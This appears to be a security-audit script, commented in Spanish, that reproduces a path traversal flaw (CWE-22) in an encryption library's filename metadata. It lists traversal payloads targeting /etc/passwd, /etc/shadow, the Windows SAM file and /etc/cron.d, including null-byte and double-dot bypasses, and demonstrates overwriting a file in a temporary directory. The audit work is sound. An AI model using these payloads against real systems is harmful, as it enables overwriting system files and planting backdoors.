"""
audit/vuln1_path_traversal.py
=============================
Reproduccion de la Vulnerabilidad 1: Path Traversal via filename metadata.

CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Descripcion:
  El campo 'filename' del contenedor (SDDV/SDDH) se acepta sin validacion al
  cifrar y se devuelve sin sanitizar al descifrar. Si la aplicacion cliente
  usa el filename del metadata para escribir el archivo descifrado en disco,
  un atacante puede inyectar nombres como '../../etc/passwd' o rutas absolutas
  para sobrescribir archivos fuera del directorio destino.

Severidad: HIGH
  - Impacto: Integridad (sobrescritura de archivos), potencialmente RCE si se
    sobrescriben binarios o configs
  - Vector: requiere que la app cliente use metadata['filename'] como path
  - Prerequisitos: ninguno; basta con cifrar un archivo con filename malicioso

Reproduccion:
  1. Atacante cifra un payload con filename = '../../../tmp/pwned.txt'
  2. Victima descifra el contenedor — recibe metadata['filename'] tal cual
  3. Si la app usa ese filename para guardar, escribe en /tmp/pwned.txt en
     lugar del directorio destino esperado
"""

import os
import sys
import tempfile

from crypto.aead import encrypt_file, decrypt_file
from crypto.hybrid import (
    encrypt_for_recipients,
    decrypt_for_recipient,
    generate_x25519_keypair,
)


def banner(text):
    print("\n" + "=" * 72)
    print(f"  {text}")
    print("=" * 72)


def step(label, value=""):
    print(f"  {label:.<28} {value}")


# ───── Caso 1: SDDV (cifrado simetrico) ──────────────────────────────────────

def reproducir_path_traversal_sddv():
    banner("CASO 1 — Path traversal en SDDV (crypto/aead.py)")

    payload = b"<contenido malicioso del atacante>"

    # Lista de filenames maliciosos que el sistema acepta sin protestar
    nombres_maliciosos = [
        "../../../etc/passwd",
        "/etc/shadow",
        "..\\..\\Windows\\System32\\config\\SAM",
        "valid.txt\x00../../../tmp/pwned",   # null-byte injection
        "/absolute/path/to/critical.conf",
        "....//....//etc/secret",            # double-dot bypass
    ]

    print(f"\n  El atacante cifra {len(payload)} bytes con cada uno de estos")
    print(f"  filenames maliciosos. El sistema los acepta sin validacion:\n")

    for nombre in nombres_maliciosos:
        try:
            container, key = encrypt_file(payload, nombre)
            # Descifrar y ver que metadata['filename'] regresa el nombre malicioso tal cual
            plaintext, meta = decrypt_file(container, key)
            print(f"  [ACEPTADO] filename = {nombre!r}")
            print(f"             metadata['filename'] retornado = {meta['filename']!r}")
        except Exception as e:
            print(f"  [RECHAZADO] {nombre!r} -> {type(e).__name__}: {e}")
        print()


# ───── Caso 2: SDDH (cifrado hibrido) ────────────────────────────────────────

def reproducir_path_traversal_sddh():
    banner("CASO 2 — Path traversal en SDDH (crypto/hybrid.py)")

    payload = b"<payload del atacante>"
    bob_priv, bob_pub = generate_x25519_keypair()

    nombres_maliciosos = [
        "../../../tmp/pwned.txt",
        "/etc/cron.d/backdoor",
    ]

    print(f"\n  El atacante cifra para Bob con filenames maliciosos:\n")

    for nombre in nombres_maliciosos:
        container = encrypt_for_recipients(payload, nombre, [bob_pub])
        plaintext, meta = decrypt_for_recipient(container, bob_priv)
        print(f"  [ACEPTADO] filename = {nombre!r}")
        print(f"             metadata['filename'] retornado = {meta['filename']!r}")
        print()


# ───── Caso 3: explotacion concreta — escritura fuera del directorio ─────────

def reproducir_explotacion_concreta():
    banner("CASO 3 — Explotacion concreta: escritura fuera del directorio")

    print("""
  Simulamos una aplicacion vulnerable que descifra un contenedor y guarda
  el plaintext con el filename del metadata. Esto es un patron tipico:

      plaintext, meta = decrypt_file(container, key)
      with open(os.path.join(out_dir, meta['filename']), 'wb') as f:
          f.write(plaintext)
""")

    # Crear un directorio destino legitimo
    out_dir = tempfile.mkdtemp(prefix="sddv_audit_")
    print(f"  Directorio destino legitimo: {out_dir}")

    # Crear un "archivo critico" fuera del directorio destino que el atacante quiere sobrescribir
    critical_dir  = tempfile.mkdtemp(prefix="critical_")
    critical_file = os.path.join(critical_dir, "config.cfg")
    with open(critical_file, "w") as f:
        f.write("contenido_legitimo=true\n")
    print(f"  Archivo critico (existe ANTES del ataque): {critical_file}")
    print(f"  Contenido original: {open(critical_file).read().strip()}")

    # Atacante cifra payload malicioso con filename relativo apuntando fuera de out_dir
    rel_path = os.path.relpath(critical_file, out_dir)
    print(f"\n  El atacante construye filename relativo: {rel_path!r}")

    payload = b"contenido_malicioso=true\n"
    container, key = encrypt_file(payload, rel_path)

    # Aplicacion vulnerable descifra y guarda con el filename
    plaintext, meta = decrypt_file(container, key)
    print(f"  Aplicacion recibe metadata['filename'] = {meta['filename']!r}")

    target_path = os.path.join(out_dir, meta["filename"])
    target_path_resolved = os.path.realpath(target_path)
    print(f"  Aplicacion escribe en: os.path.join({out_dir!r}, {meta['filename']!r})")
    print(f"  Path resuelto: {target_path_resolved}")

    with open(target_path, "wb") as f:
        f.write(plaintext)

    # Verificar que el archivo critico fue sobrescrito
    nuevo_contenido = open(critical_file).read().strip()
    print(f"\n  Contenido despues del ataque: {nuevo_contenido}")

    if nuevo_contenido == "contenido_malicioso=true":
        print(f"\n  [!!! VULNERABILIDAD CONFIRMADA !!!]")
        print(f"  El archivo {critical_file} fue sobrescrito por el contenido")
        print(f"  controlado por el atacante. La libreria cripto no detuvo este ataque.")
    else:
        print(f"\n  [esperaba sobrescritura, no ocurrio]")


# ───── main ───────────────────────────────────────────────────────────────────

def main():
    print("\n" + "#" * 72)
    print("#" + "  REPRODUCCION VULN-001: Path Traversal via filename".center(70) + "#")
    print("#" + "  CWE-22 — Severidad HIGH".center(70) + "#")
    print("#" * 72)

    reproducir_path_traversal_sddv()
    reproducir_path_traversal_sddh()
    reproducir_explotacion_concreta()

    print("\n" + "=" * 72)
    print("  CONCLUSION:")
    print("  El sistema acepta cualquier filename arbitrario sin validar y lo")
    print("  retorna intacto al descifrar. Cualquier aplicacion que use")
    print("  metadata['filename'] como path es vulnerable a path traversal.")
    print("=" * 72 + "\n")


if __name__ == "__main__":
    main()
